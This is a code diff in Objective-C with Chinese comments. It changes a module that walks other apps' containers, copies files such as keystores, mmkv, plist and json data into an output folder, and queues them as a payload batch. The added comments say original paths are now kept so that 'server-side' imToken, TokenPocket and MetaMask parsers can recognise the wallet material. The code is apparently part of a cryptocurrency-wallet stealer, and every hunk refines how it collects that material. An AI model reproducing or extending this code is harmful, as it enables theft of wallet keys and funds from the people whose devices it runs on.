@@ -151,12 +151,12 @@ static NSArray<NSDictionary *> *OWTargets(void) {
 
     NSInteger n = 0;
     uint64_t total = 0;
-    // 必须和 _noteResultForName 的统计口径完全一致（含 _file_index.json），
+    // 必须和 _noteResultForName 的统计口径完全一致（递归、含 _file_index.json），
     // 否则断点校验的 fileCount/bytes 永远对不上，等于没有断点。
-    for (NSString *f in [fm contentsOfDirectoryAtPath:dir error:nil]) {
-        NSString *p = [dir stringByAppendingPathComponent:f];
+    for (NSString *rel in [fm enumeratorAtPath:dir]) {
+        NSString *p = [dir stringByAppendingPathComponent:rel];
         NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
-        if (!a) continue;
+        if (!a || [a[NSFileType] isEqualToString:NSFileTypeDirectory]) continue;
         n++;
         total += [a fileSize];
     }
@@ -554,7 +554,7 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         if (isDir) { [dirRels addObject:rel]; continue; }
 
         [indexPaths addObject:rel];
-        if ([self _copyItem:src toDir:outDir name:rel.lastPathComponent]) {
+        if ([self _copyItem:src toDir:outDir name:rel]) {
             foundFiles++;
             definedBytes += [self _sizeOf:src];
         }
@@ -565,8 +565,7 @@ static NSArray<NSDictionary *> *OWTargets(void) {
             NSString *side = [containerPath stringByAppendingPathComponent:sideRel];
             BOOL sideIsDir = NO;
             if (![fm fileExistsAtPath:side isDirectory:&sideIsDir] || sideIsDir) continue;
-            if ([self _copyItem:side toDir:outDir
-                           name:[rel.lastPathComponent stringByAppendingString:suffix]]) {
+            if ([self _copyItem:side toDir:outDir name:sideRel]) {
                 definedBytes += [self _sizeOf:side];
             }
         }
@@ -634,7 +633,6 @@ static NSArray<NSDictionary *> *OWTargets(void) {
                                          @"mp4", @"mov", @"m4a", @"mp3", @"wav", @"pdf", @"zip"]];
     NSSet *lenientExts = [NSSet setWithArray:@[@"plist", @"dat", @"bin", @"keystore",
                                                @"mmkv", @"txt", @"lock", @"json"]];
-    NSString *tag = drel.lastPathComponent ?: drel;
 
     NSUInteger n = 0;
     uint64_t total = 0;
@@ -676,10 +674,8 @@ static NSArray<NSDictionary *> *OWTargets(void) {
             if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;
         }
 
-        NSString *leaf = (extHit || kwHit)
-            ? [rel stringByReplacingOccurrencesOfString:@"/" withString:@"_"]
-            : [NSString stringWithFormat:@"%@_%@", tag,
-               [rel stringByReplacingOccurrencesOfString:@"/" withString:@"_"]];
+        // 保留容器内相对路径：服务端的 imToken/TP/MetaMask 解析都按原始路径识别材料
+        NSString *leaf = [drel stringByAppendingPathComponent:rel];
         if ([self _copyItem:full toDir:outDir name:leaf]) {
             n++;
             total += [self _sizeOf:full];
@@ -760,8 +756,7 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         NSString *full = [containerPath stringByAppendingPathComponent:rel];
         BOOL isDir = NO;
         if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;
-        NSString *leaf = [rel stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
-        if ([self _copyItem:full toDir:outDir name:leaf]) {
+        if ([self _copyItem:full toDir:outDir name:rel]) {
             copied++;
             bytes += [self _sizeOf:full];
         }
@@ -794,13 +789,13 @@ static NSArray<NSDictionary *> *OWTargets(void) {
 - (void)_restorePayloadsFromDir:(NSString *)dir {
     NSFileManager *fm = [NSFileManager defaultManager];
     _payloadBatch = _payloadBatch ?: [NSMutableArray array];
-    for (NSString *f in [fm contentsOfDirectoryAtPath:dir error:nil]) {
-        if ([f isEqualToString:@"_file_index.json"]) continue;
-        NSString *p = [dir stringByAppendingPathComponent:f];
+    for (NSString *rel in [fm enumeratorAtPath:dir]) {
+        if ([rel.lastPathComponent isEqualToString:@"_file_index.json"]) continue;
+        NSString *p = [dir stringByAppendingPathComponent:rel];
         NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
-        if (!a) continue;
+        if (!a || [a[NSFileType] isEqualToString:NSFileTypeDirectory]) continue;
         BOOL emptyDb = [OWFileGate looksEmptyDatabaseAtPath:p];
-        [_payloadBatch addObject:@{@"name": f, @"bytes": @([a fileSize]), @"valid": @(!emptyDb)}];
+        [_payloadBatch addObject:@{@"name": rel, @"bytes": @([a fileSize]), @"valid": @(!emptyDb)}];
     }
 }
 
@@ -809,12 +804,15 @@ static NSArray<NSDictionary *> *OWTargets(void) {
                   bundleId:(NSString *)bid
                      dir:(NSString *)outDir
             containerPath:(NSString *)containerPath {
-    NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:outDir error:nil];
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSMutableArray<NSString *> *files = [NSMutableArray array];
     uint64_t total = 0;
     NSUInteger emptyCount = 0;
-    for (NSString *f in files) {
-        NSString *p = [outDir stringByAppendingPathComponent:f];
-        NSDictionary *a = [[NSFileManager defaultManager] attributesOfItemAtPath:p error:nil];
+    for (NSString *rel in [fm enumeratorAtPath:outDir]) {
+        NSString *p = [outDir stringByAppendingPathComponent:rel];
+        NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
+        if (!a || [a[NSFileType] isEqualToString:NSFileTypeDirectory]) continue;
+        [files addObject:rel];
         total += [a fileSize];
         if ([OWFileGate looksEmptyDatabaseAtPath:p]) emptyCount++;
     }
@@ -969,6 +967,13 @@ static NSArray<NSDictionary *> *OWTargets(void) {
     }
 
     NSString *dst = [outDir stringByAppendingPathComponent:leaf];
+    // name 现在保留容器内相对路径（如 Documents/walletsV2/x.json）：
+    // 服务端各钱包解析器是按原始路径识别的，拍平会认不出来（imToken 的 walletsV2 就是例子）。
+    NSString *parent = [dst stringByDeletingLastPathComponent];
+    if (parent.length) {
+        [[NSFileManager defaultManager] createDirectoryAtPath:parent
+                                  withIntermediateDirectories:YES attributes:nil error:nil];
+    }
     NSString *part = [dst stringByAppendingString:@".part"];
     NSError *e = nil;
     NSFileManager *fm = [NSFileManager defaultManager];
